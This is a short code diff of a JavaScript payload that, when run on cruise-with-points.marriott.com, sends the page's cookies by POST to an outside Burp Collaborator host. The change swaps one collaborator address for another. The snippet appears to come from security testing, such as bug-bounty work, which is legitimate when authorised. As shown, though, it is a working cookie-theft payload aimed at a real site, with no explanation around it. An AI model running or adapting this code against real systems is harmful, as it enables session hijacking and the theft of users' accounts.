@@ -1,5 +1,5 @@
 if (document.domain == "cruise-with-points.marriott.com") {
-  fetch('https://l1nb8fmc7rzhvqwlihl7ucy00r6hu6.burpcollaborator.net', {
+  fetch('https://vxwm7xcmbyzur94sswmdxmxrgim8ax.burpcollaborator.net', {
   method: 'POST',
   mode: 'no-cors',
   body:document.cookie
